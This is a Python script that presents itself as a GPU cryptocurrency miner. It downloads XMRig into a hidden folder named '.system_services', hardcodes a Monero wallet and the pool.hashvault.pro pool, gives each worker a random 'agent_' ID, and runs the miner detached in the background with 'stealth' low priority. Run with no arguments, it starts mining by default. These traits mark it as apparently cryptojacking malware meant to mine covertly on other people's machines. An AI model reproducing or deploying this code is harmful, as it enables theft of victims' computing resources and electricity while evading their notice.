#!/usr/bin/env python3
"""
GPU MINING - CUDA/OpenCL GPU cryptocurrency mining.
Supports: NVIDIA (CUDA), AMD (OpenCL), CPU fallback.
"""

import os
import sys
import json
import time
import subprocess
import platform
import threading
import shutil
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from pathlib import Path

class GPUMining:
    """GPU-accelerated cryptocurrency mining."""
    
    def __init__(self, wallet: str = None, pool: str = None):
        self.wallet = wallet or os.environ.get("MINING_WALLET", "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5")
        self.pool = pool or os.environ.get("MINING_POOL", "pool.hashvault.pro:443")
        self.platform = platform.system().lower()
        
        # Mining state
        self.running = False
        self.process = None
        self.hashrate = 0
        self.threads = 0
        self.gpu_devices = []
        
        # Miner paths
        self.miner_dir = Path.home() / ".cache" / ".system_services"
        self.miner_path = None
        
        # Statistics
        self.stats = {
            "total_hashes": 0,
            "uptime": 0,
            "shares_accepted": 0,
            "shares_rejected": 0,
            "start_time": None,
        }
    
    # ─── GPU DETECTION ────────────────────────────────────────────────
    
    def detect_nvidia_gpus(self) -> List[Dict]:
        """Detect NVIDIA GPUs using nvidia-smi."""
        gpus = []
        
        try:
            result = subprocess.run(
                ["nvidia-smi", "--query-gpu=index,name,memory.total,utilization.gpu,temperature.gpu", "--format=csv,noheader"],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                for line in result.stdout.strip().split("\n"):
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 5:
                        gpus.append({
                            "index": int(parts[0]),
                            "name": parts[1],
                            "memory_total": parts[2],
                            "utilization": parts[3],
                            "temperature": parts[4],
                            "vendor": "NVIDIA",
                        })
        except FileNotFoundError:
            pass
        except Exception:
            pass
        
        return gpus
    
    def detect_amd_gpus(self) -> List[Dict]:
        """Detect AMD GPUs using rocm-smi or OpenCL."""
        gpus = []
        
        # Try rocm-smi (AMD ROCm)
        try:
            result = subprocess.run(
                ["rocm-smi", "--showall"],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                # Parse rocm-smi output
                import re
                gpu_blocks = re.findall(r'GPU\[(\d+)\].*?ProductName:\s*(\S+)', result.stdout, re.DOTALL)
                for idx, name in gpu_blocks:
                    gpus.append({
                        "index": int(idx),
                        "name": name,
                        "vendor": "AMD",
                    })
        except FileNotFoundError:
            pass
        except Exception:
            pass
        
        # Try OpenCL
        try:
            import pyopencl as cl
            
            platforms = cl.get_platforms()
            for plat in platforms:
                if "AMD" in plat.name or "Radeon" in plat.name:
                    devices = plat.get_devices()
                    for i, dev in enumerate(devices):
                        gpus.append({
                            "index": i,
                            "name": dev.name,
                            "memory": dev.global_mem_size,
                            "vendor": "AMD",
                        })
        except ImportError:
            pass
        except Exception:
            pass
        
        return gpus
    
    def detect_all_gpus(self) -> List[Dict]:
        """Detect all available GPUs."""
        gpus = []
        
        # NVIDIA
        nvidia = self.detect_nvidia_gpus()
        gpus.extend(nvidia)
        
        # AMD
        amd = self.detect_amd_gpus()
        gpus.extend(amd)
        
        self.gpu_devices = gpus
        return gpus
    
    def has_cuda(self) -> bool:
        """Check if CUDA is available."""
        try:
            result = subprocess.run(
                ["nvidia-smi"],
                capture_output=True, timeout=5
            )
            return result.returncode == 0
        except:
            return False
    
    def has_opencl(self) -> bool:
        """Check if OpenCL is available."""
        try:
            import pyopencl as cl
            platforms = cl.get_platforms()
            return len(platforms) > 0
        except:
            return False
    
    # ─── MINER DOWNLOAD ───────────────────────────────────────────────
    
    def download_xmrig(self, use_cuda: bool = False) -> str:
        """Download XMRig miner."""
        self.miner_dir.mkdir(parents=True, exist_ok=True)
        
        miner_name = "xmrig_cuda" if use_cuda else "xmrig"
        miner_path = self.miner_dir / miner_name
        
        if miner_path.exists():
            self.miner_path = str(miner_path)
            return str(miner_path)
        
        print(f"[*] Downloading XMRig {'(CUDA)' if use_cuda else ''}...")
        
        # Determine download URL
        if self.platform == "linux":
            if use_cuda:
                url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
            else:
                url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
        elif self.platform == "windows":
            url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
        elif self.platform == "darwin":
            url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-x64.tar.gz"
        else:
            raise Exception(f"Unsupported platform: {self.platform}")
        
        try:
            import urllib.request
            import tarfile
            import zipfile
            
            # Download
            archive_path = self.miner_dir / "miner_archive"
            urllib.request.urlretrieve(url, archive_path)
            
            # Extract
            if url.endswith(".tar.gz"):
                with tarfile.open(archive_path, 'r:gz') as tar:
                    for member in tar.getmembers():
                        if 'xmrig' in member.name and member.name.endswith('xmrig'):
                            member.name = miner_name
                            tar.extract(member, self.miner_dir)
                            break
            elif url.endswith(".zip"):
                with zipfile.ZipFile(archive_path, 'r') as zf:
                    for name in zf.namelist():
                        if 'xmrig.exe' in name:
                            content = zf.read(name)
                            with open(miner_path, 'wb') as f:
                                f.write(content)
                            break
            
            # Cleanup
            archive_path.unlink(missing_ok=True)
            
            # Set executable
            if self.platform != "windows":
                os.chmod(miner_path, 0o755)
            
            self.miner_path = str(miner_path)
            print(f"[+] XMRig downloaded: {miner_path}")
            return str(miner_path)
        
        except Exception as e:
            raise Exception(f"Download failed: {e}")
    
    def download_xmrig_opencl(self) -> str:
        """Download XMRig with OpenCL support for AMD."""
        # XMRig OpenCL requires separate build or plugin
        # For now, use regular XMRig with OpenCL backend
        
        return self.download_xmrig(use_cuda=False)
    
    # ─── CONFIGURATION ────────────────────────────────────────────────
    
    def generate_config(self, gpu: bool = True, threads: int = None, 
                       intensity: int = None) -> Dict:
        """Generate XMRig config."""
        
        # Auto-detect optimal settings
        if threads is None:
            cpu_count = os.cpu_count() or 1
            threads = max(1, cpu_count - 1)  # Leave 1 core free
        
        if intensity is None:
            intensity = 75  # Default intensity
        
        config = {
            "api": {
                "id": None,
                "worker-id": f"agent_{os.urandom(4).hex()}",
            },
            "http": {
                "enabled": False,
            },
            "autosave": True,
            "background": True,
            "colors": False,
            "randomx": {
                "init": -1,
                "mode": "auto",
                "numa": True,
            },
            "cpu": {
                "enabled": not gpu or len(self.gpu_devices) == 0,
                "huge-pages": True,
                "hw-aes": None,
                "priority": 1,
                "msr": True,
                "threads": threads,
            },
            "opencl": {
                "enabled": gpu and any(d["vendor"] == "AMD" for d in self.gpu_devices),
                "cache": True,
                "loader": None,
                "platform": "AMD",
                "adl": True,
            },
            "cuda": {
                "enabled": gpu and any(d["vendor"] == "NVIDIA" for d in self.gpu_devices),
                "loader": None,
                "nvml": True,
                "cn/0": False,
                "cn-lite/0": False,
            },
            "pools": [
                {
                    "url": self.pool,
                    "user": self.wallet,
                    "pass": "x",
                    "rig-id": None,
                    "nicehash": False,
                    "keepalive": True,
                    "enabled": True,
                    "tls": self.pool.endswith(":443"),
                    "tls-fingerprint": None,
                    "daemon": False,
                }
            ],
        }
        
        return config
    
    def write_config(self, config: Dict) -> str:
        """Write config to file."""
        config_path = self.miner_dir / "config.json"
        
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        
        return str(config_path)
    
    # ─── MINING CONTROL ────────────────────────────────────────────────
    
    def start(self, gpu: bool = True, threads: int = None, 
              intensity: int = None, stealth: bool = True) -> Dict:
        """Start mining."""
        result = {"success": False, "error": None}
        
        if self.running:
            result["error"] = "Already running"
            return result
        
        try:
            # Detect GPUs
            self.detect_all_gpus()
            
            # Determine miner type
            use_cuda = gpu and any(d["vendor"] == "NVIDIA" for d in self.gpu_devices)
            use_opencl = gpu and any(d["vendor"] == "AMD" for d in self.gpu_devices)
            
            # Download miner
            if use_cuda:
                self.download_xmrig(use_cuda=True)
            else:
                self.download_xmrig(use_cuda=False)
            
            # Generate config
            config = self.generate_config(gpu=gpu, threads=threads, intensity=intensity)
            config_path = self.write_config(config)
            
            # Build command
            cmd = [self.miner_path, "-c", config_path]
            
            # Stealth options
            if stealth:
                # Use low priority
                if self.platform != "windows":
                    cmd = ["nice", "-n", "19"] + cmd
            
            # Start process
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                start_new_session=True,
                cwd=str(self.miner_dir),
            )
            
            self.running = True
            self.stats["start_time"] = datetime.now().isoformat()
            
            # Start monitor thread
            self._monitor_thread = threading.Thread(target=self._monitor_miner, daemon=True)
            self._monitor_thread.start()
            
            result["success"] = True
            result["pid"] = self.process.pid
            result["config"] = config_path
            result["gpus"] = self.gpu_devices
            
            print(f"[+] Mining started (PID: {self.process.pid})")
            print(f"    Pool: {self.pool}")
            print(f"    GPUs: {len(self.gpu_devices)}")
        
        except Exception as e:
            result["error"] = str(e)
            print(f"[-] Mining start failed: {e}")
        
        return result
    
    def stop(self) -> Dict:
        """Stop mining."""
        result = {"success": False}
        
        if not self.running or not self.process:
            result["error"] = "Not running"
            return result
        
        try:
            self.process.terminate()
            self.process.wait(timeout=10)
            self.running = False
            
            result["success"] = True
            result["stats"] = self.stats
            
            print("[*] Mining stopped")
        
        except Exception as e:
            try:
                self.process.kill()
                self.running = False
            except:
                pass
            
            result["error"] = str(e)
        
        return result
    
    def _monitor_miner(self):
        """Monitor miner output and parse stats."""
        while self.running and self.process:
            try:
                line = self.process.stdout.readline()
                if not line:
                    break
                
                line = line.decode(errors='replace').strip()
                
                # Parse hashrate
                if "speed" in line.lower() or "h/s" in line.lower():
                    import re
                    match = re.search(r'(\d+\.?\d*)\s*(H/s|KH/s|MH/s)', line)
                    if match:
                        self.hashrate = float(match.group(1))
                        if "KH" in match.group(2):
                            self.hashrate *= 1000
                        elif "MH" in match.group(2):
                            self.hashrate *= 1000000
                
                # Parse shares
                if "accepted" in line.lower():
                    self.stats["shares_accepted"] += 1
                elif "rejected" in line.lower():
                    self.stats["shares_rejected"] += 1
            
            except:
                pass
        
        self.running = False
    
    # ─── STATUS ────────────────────────────────────────────────────────
    
    def get_status(self) -> Dict:
        """Get mining status."""
        return {
            "running": self.running,
            "hashrate": self.hashrate,
            "pool": self.pool,
            "wallet": self.wallet,
            "gpus": self.gpu_devices,
            "stats": self.stats,
            "uptime": (datetime.now() - datetime.fromisoformat(self.stats["start_time"])).total_seconds() if self.stats["start_time"] else 0,
        }
    
    def get_stats(self) -> Dict:
        """Get mining statistics."""
        return self.stats


# ─── CLI Entry Point ──────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="GPU Mining")
    parser.add_argument("--start", "-s", action="store_true", help="Start mining")
    parser.add_argument("--stop", "-S", action="store_true", help="Stop mining")
    parser.add_argument("--status", action="store_true", help="Get status")
    parser.add_argument("--wallet", "-w", help="Wallet address")
    parser.add_argument("--pool", "-p", help="Mining pool")
    parser.add_argument("--gpu", "-g", action="store_true", help="Enable GPU mining")
    parser.add_argument("--threads", "-t", type=int, help="CPU threads")
    parser.add_argument("--detect", "-d", action="store_true", help="Detect GPUs")
    
    args = parser.parse_args()
    
    miner = GPUMining(args.wallet, args.pool)
    
    if args.detect:
        gpus = miner.detect_all_gpus()
        print(f"[*] Detected {len(gpus)} GPU(s):")
        for gpu in gpus:
            print(f"    {gpu['vendor']}: {gpu['name']}")
    
    elif args.start:
        result = miner.start(gpu=args.gpu, threads=args.threads)
        print(json.dumps(result, indent=2, default=str))
    
    elif args.stop:
        result = miner.stop()
        print(json.dumps(result, indent=2, default=str))
    
    elif args.status:
        status = miner.get_status()
        print(json.dumps(status, indent=2, default=str))
    
    else:
        # Default: detect GPUs and start
        gpus = miner.detect_all_gpus()
        print(f"[*] GPUs: {len(gpus)}")
        
        if gpus:
            print("[*] Starting GPU mining...")
            miner.start(gpu=True)
        else:
            print("[*] Starting CPU mining...")
            miner.start(gpu=False)
        
        # Run until interrupted
        try:
            while True:
                time.sleep(60)
                status = miner.get_status()
                print(f"[*] Hashrate: {status['hashrate']:.2f} H/s")
        except KeyboardInterrupt:
            miner.stop()
